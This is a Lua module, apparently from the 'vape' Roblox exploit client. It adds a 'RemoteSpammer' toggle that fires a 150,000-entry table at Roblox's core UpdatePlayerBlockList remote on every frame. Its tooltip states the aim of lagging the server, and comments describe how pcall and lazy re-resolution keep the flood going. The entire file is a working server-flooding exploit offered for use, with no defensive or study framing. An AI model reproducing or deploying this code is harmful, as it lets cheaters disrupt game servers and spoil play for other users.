local RemoteSpammer
local blockListRemote
local PAYLOAD_SIZE = 150000

-- the size of the payload is what makes the spam expensive, so it is built once per
-- enable and reused instead of being rebuilt per fire
local function getPayload()
	local payload = table.create(PAYLOAD_SIZE)
	for index = 1, PAYLOAD_SIZE do
		payload[index] = {id = index, v = index * 2}
	end

	return payload
end

-- a roblox core remote, so it is resolved lazily and re-checked rather than trusted
-- to stay where it was when the module was enabled
local function getBlockListRemote()
	if blockListRemote and blockListRemote.Parent then
		return blockListRemote
	end

	local container = game:FindFirstChild('RobloxReplicatedStorage')
	local remote = container and container:FindFirstChild('UpdatePlayerBlockList')
	if remote and (remote:IsA('RemoteEvent') or remote:IsA('UnreliableRemoteEvent')) then
		blockListRemote = cloneref(remote)
		return blockListRemote
	end
end

RemoteSpammer = vape.Categories.World:CreateModule({
	Name = 'RemoteSpammer',
	Function = function(callback)
		if callback then
			local payload = getPayload()
			notif('RemoteSpammer', 'Spamming the block list remote.', 5)

			repeat
				local remote = getBlockListRemote()
				if remote then
					-- a payload this large can be rejected, which must not kill the spam
					pcall(remote.FireServer, remote, payload)
				end

				runService.Heartbeat:Wait()
			until not RemoteSpammer.Enabled
		end
	end,
	Tooltip = 'Spams the UpdatePlayerBlockList remote with a huge payload to lag the server.'
})
